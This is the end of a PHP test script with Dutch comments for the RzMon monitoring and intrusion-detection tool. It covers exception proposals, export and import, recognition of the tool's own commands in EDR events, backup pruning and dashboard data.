$pr = array_values(array_filter(Exceptions::proposals(), static fn($p) => ($p['cond']['program'][0] ?? '') === 'rclone'));
ok(count($pr) === 1 && $pr[0]['hits'] === 65 && $pr[0]['rule'] === 'out_country', 'voorstel: rclone naar US en IE samen, 65×');
ok(!array_filter(Exceptions::proposals(), static fn($p) => str_starts_with((string) ($p['cond']['program'][0] ?? ''), 'Plex')), 'wat al uitgezonderd is (Plex) staat niet bij de voorstellen');
ok(Exceptions::addProposals([$pr[0]['id']], 'ci') === 1 && !array_filter(Exceptions::proposals(), static fn($p) => ($p['cond']['program'][0] ?? '') === 'rclone'), 'voorstel met één knop toegevoegd; daarna geen voorstel meer');
// Exporteren en importeren
$exp = Exceptions::export();
$cnt = (int) q('SELECT COUNT(*) FROM ids_exceptions')->fetchColumn();
q('DELETE FROM ids_exceptions');
$imp = Exceptions::import($exp, 'ci');
ok($imp['added'] === $cnt && !$imp['skipped'] && (int) q("SELECT scope_val FROM ids_exceptions WHERE name = 'Healthchecks'")->fetchColumn() === (int) $ha, 'exporteren en importeren (server op naam terug naar zijn id)');
// Eigen processen: het kenmerk van RzMon in een opdracht
$mark = Edr::selfMark();
ok(preg_match('/^[0-9a-f]{24}$/', $mark) === 1 && rz_sh('id') === ": rzmon:$mark; id" && Edr::isSelfCmd(rz_sh('getent hosts 1.2.3.4')) && Edr::isSelfCmd('/bin/sh -c /usr/bin/php ' . SM_ROOT . '/cron/run.php')
    && !Edr::isSelfCmd(': rzmon:ffffffffffffffffffffffff; id'), 'kenmerk van RzMon: in elke opdracht, en alleen het echte kenmerk telt');
$c0 = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 7070, 'st' => 1, 'uid' => 48, 'u' => 'apache', 'exe' => '/usr/bin/bash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'x'], 'cmd' => rz_sh('timeout 2 getent hosts 1.2.3.4'), 'pc' => 'php-fpm']]]);
$row = q("SELECT * FROM edr_events WHERE host_id = ? ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn() === $c0 && $row['own'] === 'rzmon' && !str_contains((string) $row['data'], $mark),
    'opdracht van RzMon (php-fpm → sh): geen webshell-melding, eigen regel, en het kenmerk wordt niet bewaard');
save_setting('ids_mode', 'learn');

// 1.133.0: handmatige back-ups opruimen (0 = alles bewaren); geüploade blijven altijd
$bkOld = $GLOBALS['sm_config']['backup_dir'] ?? null;
$GLOBALS['sm_config']['backup_dir'] = sys_get_temp_dir() . '/rzmon-ci-bk-' . getmypid();   // eigen lege map: echte back-ups blijven buiten schot
@mkdir(Backup::dir(), 0700, true);
$mkzip = static function (string $name): void { $z = new ZipArchive(); $z->open(Backup::dir() . "/$name", ZipArchive::CREATE); $z->addFromString('info.txt', 'ci'); $z->close(); };
foreach ([1, 2, 3, 4] as $d) { $mkzip("rzmon-backup-2026010$d-120000-manual.zip"); }
$mkzip('rzmon-backup-20260101-130000-upload.zip');
save_setting('backup_keep_manual', '0');
Backup::prune();
$mine = static fn(string $t) => count(glob(Backup::dir() . "/rzmon-backup-2026*-$t.zip") ?: []);
ok($mine('manual') === 4, 'handmatige back-ups: 0 = alles bewaren');
save_setting('backup_keep_manual', '2');
Backup::prune();
ok($mine('manual') === 2 && is_file(Backup::dir() . '/rzmon-backup-20260104-120000-manual.zip') && !is_file(Backup::dir() . '/rzmon-backup-20260101-120000-manual.zip') && $mine('upload') === 1,
    'handmatige back-ups: de nieuwste 2 blijven, geüploade blijven staan');
foreach (glob(Backup::dir() . '/*') ?: [] as $f) { unlink($f); }
rmdir(Backup::dir());
$GLOBALS['sm_config']['backup_dir'] = $bkOld;
save_setting('backup_keep_manual', '0');

// 1.134.0: Dashboard: alles samen; alleen-lezen ziet geen analyse, CVE's of netwerk
$hm = Home::data(true, '30d');
ok($hm['full'] && $hm['period'] === '30d' && is_int($hm['score']) && isset($hm['ids']['open'][1], $hm['ids']['open'][2], $hm['avail']['series'], $hm['ids']['series']['blk'])
    && array_key_exists('vulns', $hm) && array_key_exists('net', $hm) && is_array($hm['events']) && count($hm['events']) <= 8, 'dashboard: score, IDS, beschikbaarheid, CVE en netwerk samen');
$ro = Home::data(false, 'xx');
ok(!$ro['full'] && $ro['period'] === '7d' && !isset($ro['todo']) && !isset($ro['vulns']) && !isset($ro['net']) && isset($ro['ids']['open_total'])
    && !array_filter($ro['events'], static fn($e) => in_array($e['kind'], ['sec', 'info'], true)), 'dashboard alleen-lezen: geen analyse, CVE\'s, netwerk of beveiligingsmeldingen');

echo "\n" . ($fails ? "✘ $fails van $n mislukt\n" : "✔ alle $n tests geslaagd\n");
exit($fails ? 1 : 0);
